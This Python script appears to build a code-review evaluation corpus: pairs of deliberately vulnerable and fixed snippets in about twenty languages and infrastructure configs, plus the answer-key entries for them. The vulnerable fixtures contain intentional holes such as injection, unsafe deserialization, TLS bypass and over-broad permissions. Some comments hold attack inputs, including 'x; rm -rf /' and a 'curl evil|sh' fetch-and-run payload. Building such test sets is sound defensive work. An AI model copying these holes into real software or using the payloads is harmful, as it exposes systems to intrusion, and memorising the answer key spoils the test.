#!/usr/bin/env python3
"""Build the expanded eval corpus for code-review.

For each language/infra module we add ONE canonical vuln + its safe twin,
targeted at the exact signature footgun that module documents. The script
writes the fixture files, then locates the sink line in each vuln file and
appends self-consistent entries to expected.json (must_catch + must_not_flag)
and golden_candidate.json (the ideal review output), so the harness self-test
(score golden vs expected) stays recall=1.0 / 0 FP / 0 halluc.
"""
import json
from pathlib import Path

EVALS = Path(__file__).resolve().parent
FIX = EVALS / "fixtures"

# Each entry: a canonical vuln aimed at the module's marquee class + its safe twin.
# `sink` must be a UNIQUE substring of exactly one line in the vuln file — that line
# becomes the golden quote and its number drives near_line.
FIXTURES = [
    # ---------------------------------------------------------------- JS/TS
    dict(
        name="js-proto-pollution", category="prototype", severity="HIGH",
        vuln_file="vuln_protopollution.js", safe_file="safe_protopollution.js",
        sink='dst[k] = src[k];',
        vuln='''// merge user-controlled JSON into a config object (Express handler)
function merge(dst, src) {
  for (const k of Object.keys(src)) {
    if (typeof src[k] === "object" && src[k] !== null) {
      dst[k] = dst[k] || {};
      merge(dst[k], src[k]);
    } else {
      dst[k] = src[k];           // __proto__ from req.body pollutes Object.prototype
    }
  }
  return dst;
}

app.post("/settings", (req, res) => {
  const cfg = merge({}, req.body);  // attacker sends {"__proto__":{"isAdmin":true}}
  res.json(cfg);
});
''',
        safe='''// same merge, but proto-keys are rejected and the recursion is null-proto
const BLOCKED = new Set(["__proto__", "constructor", "prototype"]);

function merge(dst, src) {
  for (const k of Object.keys(src)) {
    if (BLOCKED.has(k)) continue;            // refuse the gadget keys
    if (typeof src[k] === "object" && src[k] !== null) {
      dst[k] = dst[k] || Object.create(null);
      merge(dst[k], src[k]);
    } else {
      dst[k] = src[k];
    }
  }
  return dst;
}

app.post("/settings", (req, res) => {
  const cfg = merge(Object.create(null), req.body);
  res.json(cfg);
});
''',
    ),
    # ---------------------------------------------------------------- Go
    dict(
        name="go-sh-c", category="cmdi", severity="CRITICAL",
        vuln_file="vuln_cmdi.go", safe_file="safe_cmdi.go",
        sink='cmd := exec.Command("sh", "-c", "ping -c1 "+host)',
        vuln='''package main

import (
	"net/http"
	"os/exec"
)

func ping(w http.ResponseWriter, r *http.Request) {
	host := r.URL.Query().Get("host")
	cmd := exec.Command("sh", "-c", "ping -c1 "+host) // host="x; rm -rf /" → RCE (gosec G204)
	out, _ := cmd.CombinedOutput()
	w.Write(out)
}
''',
        safe='''package main

import (
	"net/http"
	"os/exec"
)

func ping(w http.ResponseWriter, r *http.Request) {
	host := r.URL.Query().Get("host")
	cmd := exec.Command("ping", "-c", "1", "--", host) // fixed binary, arg slice, no shell
	out, _ := cmd.CombinedOutput()
	w.Write(out)
}
''',
    ),
    # ---------------------------------------------------------------- Java
    dict(
        name="java-readobject", category="deserial", severity="CRITICAL",
        vuln_file="vuln_deser.java", safe_file="safe_deser.java",
        sink='Object obj = new ObjectInputStream(req.getInputStream()).readObject();',
        vuln='''import java.io.ObjectInputStream;
import javax.servlet.http.*;

public class Import extends HttpServlet {
  protected void doPost(HttpServletRequest req, HttpServletResponse resp) throws Exception {
    // attacker bytes -> gadget-chain RCE (commons-collections lineage, CVE-2017-9805 class)
    Object obj = new ObjectInputStream(req.getInputStream()).readObject();
    process(obj);
  }
}
''',
        safe='''import com.fasterxml.jackson.databind.ObjectMapper;
import javax.servlet.http.*;

public class Import extends HttpServlet {
  static final ObjectMapper M = new ObjectMapper(); // no polymorphic typing enabled

  protected void doPost(HttpServletRequest req, HttpServletResponse resp) throws Exception {
    // bind to a known DTO; never reconstruct arbitrary Java types from input
    Settings s = M.readValue(req.getInputStream(), Settings.class);
    process(s);
  }
}
''',
    ),
    # ---------------------------------------------------------------- C++
    dict(
        name="cpp-iterator-invalidation", category="lifetime", severity="HIGH",
        vuln_file="vuln_uaf.cpp", safe_file="safe_uaf.cpp",
        sink='int& first = v[0];          // reference into the buffer',
        vuln='''#include <vector>

int sum_with_first(std::vector<int>& v, int n) {
    int& first = v[0];          // reference into the buffer
    for (int i = 0; i < n; ++i)
        v.push_back(i);         // reallocation invalidates `first` -> use-after-free read
    return first + v.back();    // `first` now dangles into freed storage
}
''',
        safe='''#include <vector>

int sum_with_first(std::vector<int>& v, int n) {
    v.reserve(v.size() + n);    // no reallocation during the loop...
    int first = v[0];           // ...but still copy the value, don't hold a reference
    for (int i = 0; i < n; ++i)
        v.push_back(i);
    return first + v.back();
}
''',
    ),
    # ---------------------------------------------------------------- C#
    dict(
        name="csharp-binaryformatter", category="deserial", severity="CRITICAL",
        vuln_file="vuln_deser.cs", safe_file="safe_deser.cs",
        sink='var obj = new BinaryFormatter().Deserialize(req.Body);',
        vuln='''using System.Runtime.Serialization.Formatters.Binary;

public class ImportController {
    public IActionResult Post(HttpRequest req) {
        // ysoserial.net makes this turnkey RCE; BinaryFormatter cannot be made safe
        var obj = new BinaryFormatter().Deserialize(req.Body);
        return Ok(Process(obj));
    }
}
''',
        safe='''using System.Text.Json;

public class ImportController {
    public IActionResult Post(HttpRequest req) {
        // bind to a concrete model; no type comes from the payload
        var dto = JsonSerializer.Deserialize<SettingsDto>(req.Body);
        return Ok(Process(dto));
    }
}
''',
    ),
    # ---------------------------------------------------------------- PHP
    dict(
        name="php-unserialize", category="object-injection", severity="CRITICAL",
        vuln_file="vuln_unserialize.php", safe_file="safe_unserialize.php",
        sink='$data = unserialize($_GET["state"]);',
        vuln='''<?php
// POP-chain object injection: attacker controls which objects are built and
// which magic methods (__wakeup/__destruct) fire -> RCE / file write.
$data = unserialize($_GET["state"]);
echo render($data);
''',
        safe='''<?php
// structured data only; no PHP objects are reconstructed from input
$data = json_decode($_GET["state"], true, 32, JSON_THROW_ON_ERROR);
echo render($data);
''',
    ),
    # ---------------------------------------------------------------- Rust
    dict(
        name="rust-from-raw-parts", category="unsafe", severity="HIGH",
        vuln_file="vuln_unsafe.rs", safe_file="safe_unsafe.rs",
        sink='let s = unsafe { std::slice::from_raw_parts(buf.as_ptr(), len) };',
        vuln='''// `len` is attacker-controlled (e.g. a length prefix from the wire).
// from_raw_parts with a length larger than the allocation = OOB read (UB).
fn read_slice(buf: &[u8], len: usize) -> Vec<u8> {
    let s = unsafe { std::slice::from_raw_parts(buf.as_ptr(), len) };
    s.to_vec()
}
''',
        safe='''// bounds-check the requested length against the real allocation; stay in safe Rust
fn read_slice(buf: &[u8], len: usize) -> Vec<u8> {
    let end = len.min(buf.len());
    buf[..end].to_vec()
}
''',
    ),
    # ---------------------------------------------------------------- Shell
    dict(
        name="shell-eval", category="cmdi", severity="CRITICAL",
        vuln_file="vuln_cmdi.sh", safe_file="safe_cmdi.sh",
        sink='eval "tar -xf $archive -C $dest"',
        vuln='''#!/bin/bash
# unpack an upload — archive/dest come from a request
archive="$1"
dest="$2"
eval "tar -xf $archive -C $dest"   # archive='x.tar; curl evil|sh' -> RCE; also word-splits
''',
        safe='''#!/bin/bash
set -euo pipefail
archive="$1"
dest="$2"
tar -xf "$archive" -C "$dest" --   # no eval, quoted, -- ends option parsing
''',
    ),
    # ---------------------------------------------------------------- Kotlin
    dict(
        name="kotlin-template-sql", category="sqli", severity="CRITICAL",
        vuln_file="vuln_sqli.kt", safe_file="safe_sqli.kt",
        sink='val rs = stmt.executeQuery("SELECT * FROM users WHERE id = $id")',
        vuln='''import java.sql.Connection

fun user(conn: Connection, id: String): String {
    val stmt = conn.createStatement()
    // a Kotlin string template is just concatenation -> SQL injection (id = "1 OR 1=1")
    val rs = stmt.executeQuery("SELECT * FROM users WHERE id = $id")
    return if (rs.next()) rs.getString("name") else ""
}
''',
        safe='''import java.sql.Connection

fun user(conn: Connection, id: String): String {
    val ps = conn.prepareStatement("SELECT * FROM users WHERE id = ?")
    ps.setString(1, id)            // bound parameter, not interpolated
    val rs = ps.executeQuery()
    return if (rs.next()) rs.getString("name") else ""
}
''',
    ),
    # ---------------------------------------------------------------- Dart
    dict(
        name="dart-badcert", category="tls", severity="HIGH",
        vuln_file="vuln_tls.dart", safe_file="safe_tls.dart",
        sink='client.badCertificateCallback = (cert, host, port) => true;',
        vuln='''import 'dart:io';

// disabling certificate validation makes every TLS connection MITM-able
HttpClient insecureClient() {
  final client = HttpClient();
  client.badCertificateCallback = (cert, host, port) => true; // accepts ANY cert
  return client;
}
''',
        safe='''import 'dart:io';

// default validation left intact; pin via SecurityContext for high-value apps
HttpClient secureClient() {
  final client = HttpClient(); // badCertificateCallback unset -> system trust applies
  return client;
}
''',
    ),
    # ---------------------------------------------------------------- Swift
    dict(
        name="swift-trust-all", category="tls", severity="HIGH",
        vuln_file="vuln_tls.swift", safe_file="safe_tls.swift",
        sink='completionHandler(.useCredential, URLCredential(trust: trust))',
        vuln='''import Foundation

class TrustAll: NSObject, URLSessionDelegate {
  func urlSession(_ s: URLSession, didReceive c: URLAuthenticationChallenge,
                  completionHandler: @escaping (URLSession.AuthChallengeDisposition, URLCredential?) -> Void) {
    let trust = c.protectionSpace.serverTrust!
    completionHandler(.useCredential, URLCredential(trust: trust)) // accepts every server cert
  }
}
''',
        safe='''import Foundation

class DefaultTrust: NSObject, URLSessionDelegate {
  func urlSession(_ s: URLSession, didReceive c: URLAuthenticationChallenge,
                  completionHandler: @escaping (URLSession.AuthChallengeDisposition, URLCredential?) -> Void) {
    completionHandler(.performDefaultHandling, nil) // let the OS validate the chain
  }
}
''',
    ),
    # ---------------------------------------------------------------- Docker
    dict(
        name="docker-root-secret", category="docker", severity="HIGH",
        vuln_file="vuln.Dockerfile", safe_file="safe.Dockerfile",
        sink='ENV API_KEY=sk_live_51HxbakedIntoLayer',
        vuln='''FROM node:latest
WORKDIR /app
COPY . .
RUN npm install
ENV API_KEY=sk_live_51HxbakedIntoLayer   # secret persists in image layers, extractable
EXPOSE 3000
CMD ["node", "server.js"]
# no USER -> runs as root; a container escape lands as host root
''',
        safe='''FROM node:20.11-bookworm-slim
WORKDIR /app
COPY package*.json ./
RUN npm ci --omit=dev
COPY . .
RUN useradd -r -u 10001 app
USER app                                 # non-root runtime
EXPOSE 3000
CMD ["node", "server.js"]
# API_KEY injected at runtime via the orchestrator's secret store, never baked in
''',
    ),
    # ---------------------------------------------------------------- Kubernetes
    dict(
        name="k8s-privileged", category="k8s", severity="CRITICAL",
        vuln_file="vuln-pod.yaml", safe_file="safe-pod.yaml",
        sink='privileged: true',
        vuln='''apiVersion: v1
kind: Pod
metadata:
  name: worker
spec:
  containers:
    - name: worker
      image: app:1.0
      securityContext:
        privileged: true          # host namespaces + all caps -> trivial node escape
''',
        safe='''apiVersion: v1
kind: Pod
metadata:
  name: worker
spec:
  containers:
    - name: worker
      image: app@sha256:deadbeef
      securityContext:
        privileged: false
        runAsNonRoot: true
        runAsUser: 10001
        allowPrivilegeEscalation: false
        readOnlyRootFilesystem: true
        capabilities:
          drop: ["ALL"]
''',
    ),
    # ---------------------------------------------------------------- Terraform
    dict(
        name="tf-open-sg", category="terraform", severity="HIGH",
        vuln_file="vuln-sg.tf", safe_file="safe-sg.tf",
        sink='cidr_blocks = ["0.0.0.0/0"]',
        vuln='''resource "aws_security_group" "ssh" {
  name = "ssh"
  ingress {
    from_port   = 22
    to_port     = 22
    protocol    = "tcp"
    cidr_blocks = ["0.0.0.0/0"]   # SSH open to the entire internet
  }
}
''',
        safe='''variable "admin_cidr" { type = string }

resource "aws_security_group" "ssh" {
  name = "ssh"
  ingress {
    from_port   = 22
    to_port     = 22
    protocol    = "tcp"
    cidr_blocks = [var.admin_cidr]  # restricted to the admin range only
  }
}
''',
    ),
    # ---------------------------------------------------------------- CI/CD
    dict(
        name="ci-pull-request-target", category="ci", severity="CRITICAL",
        vuln_file="vuln-workflow.yml", safe_file="safe-workflow.yml",
        sink='ref: ${{ github.event.pull_request.head.sha }}',
        vuln='''on: pull_request_target          # runs with base-repo secrets + write token
jobs:
  build:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@v4
        with:
          ref: ${{ github.event.pull_request.head.sha }}  # checks out attacker PR code (pwn request)
      - run: npm ci && npm run build      # attacker-controlled scripts run with secrets
''',
        safe='''on: pull_request                  # untrusted PR runs with NO secrets and a read-only token
jobs:
  build:
    runs-on: ubuntu-latest
    permissions:
      contents: read
    steps:
      - uses: actions/checkout@v4         # default ref = the PR merge commit, unprivileged
      - run: npm ci && npm run build
''',
    ),
    # ---------------------------------------------------------------- Nginx
    dict(
        name="nginx-alias-traversal", category="nginx", severity="HIGH",
        vuln_file="vuln-nginx.conf", safe_file="safe-nginx.conf",
        sink='alias /var/www/files/;',
        vuln='''server {
  location /files {            # NO trailing slash on the location...
    alias /var/www/files/;     # ...so /files../etc/passwd escapes the directory (off-by-slash)
  }
}
''',
        safe='''server {
  location /files/ {           # trailing slashes matched on both sides
    alias /var/www/files/;
  }
}
''',
    ),
    # ---------------------------------------------------------------- AWS IAM
    dict(
        name="iam-admin-wildcard", category="iam", severity="HIGH",
        vuln_file="vuln-iam.json", safe_file="safe-iam.json",
        sink='"Action": "*",',
        vuln='''{
  "Version": "2012-10-17",
  "Statement": [
    {
      "Effect": "Allow",
      "Action": "*",
      "Resource": "*"
    }
  ]
}
''',
        safe='''{
  "Version": "2012-10-17",
  "Statement": [
    {
      "Effect": "Allow",
      "Action": ["s3:GetObject", "s3:PutObject"],
      "Resource": "arn:aws:s3:::app-uploads/*"
    }
  ]
}
''',
    ),
    # ---------------------------------------------------------------- Redis
    dict(
        name="redis-public-noauth", category="redis", severity="CRITICAL",
        vuln_file="vuln-redis.conf", safe_file="safe-redis.conf",
        sink='bind 0.0.0.0',
        vuln='''bind 0.0.0.0
protected-mode no
# no requirepass -> anyone on the network runs CONFIG SET / writes a webshell (classic Redis RCE)
''',
        safe='''bind 127.0.0.1 ::1
protected-mode yes
requirepass ${REDIS_PASSWORD}
rename-command CONFIG ""
''',
    ),
    # ---------------------------------------------------------------- Postgres
    dict(
        name="pg-trust-auth", category="postgres", severity="CRITICAL",
        vuln_file="vuln-pg_hba.conf", safe_file="safe-pg_hba.conf",
        sink='host    all    all    0.0.0.0/0    trust',
        vuln='''# TYPE  DATABASE  USER  ADDRESS      METHOD
host    all    all    0.0.0.0/0    trust   # password-less login from the whole internet
''',
        safe='''# TYPE   DATABASE  USER     ADDRESS        METHOD
hostssl  app       app_user 10.0.0.0/8     scram-sha-256
''',
    ),
    # ---------------------------------------------------------------- GraphQL
    dict(
        name="graphql-introspection-nodepth", category="graphql", severity="MEDIUM",
        vuln_file="vuln-graphql.js", safe_file="safe-graphql.js",
        sink='introspection: true,',
        vuln='''import { ApolloServer } from "@apollo/server";

// prod server exposes the full schema and has no depth/complexity cap
const server = new ApolloServer({
  schema,
  introspection: true,            // schema map handed to attackers in production
  // (and no validationRules -> a recursive query is an unbounded DB-hit DoS)
});
''',
        safe='''import { ApolloServer } from "@apollo/server";
import depthLimit from "graphql-depth-limit";
import { createComplexityLimitRule } from "graphql-validation-complexity";

const server = new ApolloServer({
  schema,
  introspection: process.env.NODE_ENV !== "production",
  validationRules: [depthLimit(8), createComplexityLimitRule(1000)],
});
''',
    ),
]


def line_of(text: str, sink: str) -> int:
    lines = text.splitlines()
    hits = [i + 1 for i, ln in enumerate(lines) if sink in ln]
    if len(hits) != 1:
        raise SystemExit(f"sink {sink!r} found {len(hits)} times (need exactly 1)")
    return hits[0]


def quote_line(text: str, sink: str) -> str:
    for ln in text.splitlines():
        if sink in ln:
            return ln.strip()
    raise SystemExit(f"sink not found: {sink}")


def main():
    expected = json.loads((EVALS / "expected.json").read_text())
    golden = json.loads((FIX / "golden_candidate.json").read_text())

    gid = len(golden["findings"])
    have = {e.get("tag") for e in expected["must_catch"]}
    added = 0
    for fx in FIXTURES:
        if fx["name"] in have:
            continue                      # idempotent: already in the corpus, skip
        (FIX / fx["vuln_file"]).write_text(fx["vuln"])
        (FIX / fx["safe_file"]).write_text(fx["safe"])
        L = line_of(fx["vuln"], fx["sink"])
        q = quote_line(fx["vuln"], fx["sink"])

        expected["must_catch"].append({
            "file": f"fixtures/{fx['vuln_file']}",
            "category": fx["category"],
            "min_severity": fx["severity"],
            "near_line": L,
            "tag": fx["name"],
        })
        expected["must_not_flag"].append({
            "file": f"fixtures/{fx['safe_file']}",
            "reason": f"safe twin of {fx['name']}",
        })
        gid += 1
        golden["findings"].append({
            "id": f"L{gid}",
            "severity": fx["severity"],
            "category": fx["category"],
            "file": f"fixtures/{fx['vuln_file']}",
            "lines": [L, L],
            "quote": q,
            "cve": None,
        })
        added += 1

    (EVALS / "expected.json").write_text(json.dumps(expected, indent=2) + "\n")
    (FIX / "golden_candidate.json").write_text(json.dumps(golden, indent=2) + "\n")
    print(f"added {added} fixture pairs; "
          f"must_catch={len(expected['must_catch'])} golden={len(golden['findings'])}")


if __name__ == "__main__":
    main()
